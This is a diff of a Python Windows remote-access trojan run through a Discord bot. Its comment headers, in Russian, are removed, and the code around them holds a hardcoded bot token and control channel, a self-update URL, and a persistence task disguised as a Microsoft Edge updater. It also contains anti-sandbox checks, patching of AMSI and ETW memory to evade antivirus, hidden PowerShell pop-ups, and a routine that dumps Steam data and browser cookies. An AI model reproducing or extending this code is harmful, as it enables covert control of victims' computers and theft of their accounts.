@@ -21,7 +21,6 @@ import wave
 import webbrowser
 import winreg
 from pathlib import Path
-
 import comtypes
 import discord
 from discord.ext import commands
@@ -37,17 +36,13 @@ from Crypto.Cipher import AES
 from PIL import ImageGrab
 from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume
 
-================= КОНФИГУРАЦИЯ =================
+
 BOT_TOKEN = "c3c5720eedb6f9457b065ab8b6a8642fb6f2222588bf547e506bc206487132b0"
 CONTROL_CHANNEL_ID = 1536306696832426054
 RAW_GITHUB_URL = "https://raw.githubusercontent.com/ht-at/maintudu/refs/heads/main/bot.py"
 TASK_NAME = "MicrosoftEdgeUpdateTaskMachineUA2"
 TASK_DESC = "Microsoft Edge Update Task Machine UA"
-================================================
 
----------------------------------------------------------
-1. ОБХОД АНТИВИРУСА: ПАТЧ ПАМЯТИ AMSI & ETW + ANTI-SANDBOX
----------------------------------------------------------
 def check_environment() -> bool:
     if os.cpu_count() and os.cpu_count() < 2: return False
     if psutil.virtual_memory().total < 3 * (1024 ** 3): return False
@@ -92,9 +87,6 @@ def bypass_av_memory():
                     k32.VirtualProtect(addr, len(patch), old_prot.value, ctypes.byref(old_prot))
     except Exception: pass
 
----------------------------------------------------------
-2. СКРЫТАЯ АВТОЗАГРУЗКА ЧЕРЕЗ TASK SCHEDULER (COM)
----------------------------------------------------------
 def install_stealth_task():
     try:
         comtypes.CoInitialize()
@@ -157,9 +149,6 @@ def uninstall_stealth_task():
         try: comtypes.CoUninitialize()
         except Exception: pass
 
----------------------------------------------------------
-3. СКРЫТЫЙ АУДИОПЛЕЕР MCI (БЕЗ СЛЕДОВ В МИКШЕРЕ)
----------------------------------------------------------
 def play_sound_mci(url: str):
     def _worker():
         try:
@@ -184,9 +173,7 @@ def play_sound_mci(url: str):
         except Exception: pass
     threading.Thread(target=_worker, daemon=True).start()
 
----------------------------------------------------------
-4. КОНСТРУКТОР КАСТОМНОЙ РЕКЛАМЫ (WIN32 API + TOAST)
----------------------------------------------------------
+
 def show_custom_ad(title: str, text: str, link: str = "", img_url: str = ""):
     def _worker():
         img_local_path = ""
@@ -227,7 +214,6 @@ def show_custom_ad(title: str, text: str, link: str = "", img_url: str = ""):
             
         subprocess.Popen(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_toast], creationflags=0x08000000)
 
-        # Нативный Win32 Popup вместо Tkinter (избегаем segfault в daemon-потоках)
         try:
             MB_OK = 0x00000000
             MB_ICONINFORMATION = 0x00000040
@@ -241,9 +227,6 @@ def show_custom_ad(title: str, text: str, link: str = "", img_url: str = ""):
                 except Exception: pass
     threading.Thread(target=_worker, daemon=True).start()
 
----------------------------------------------------------
-5. МИКРОФОН, ОКНА И ВЫГРУЗКА ДАННЫХ
----------------------------------------------------------
 def get_active_window() -> str:
     hwnd = ctypes.windll.user32.GetForegroundWindow()
     length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
@@ -363,9 +346,6 @@ def dump_steam_and_cookies() -> io.BytesIO:
     out.seek(0)
     return out
 
----------------------------------------------------------
-6. DISCORD C2 БОТ И КОМАНДНЫЙ ИНТЕРФЕЙС
----------------------------------------------------------
 intents = discord.Intents.default()
 intents.message_content = True
 intents.voice_states = True
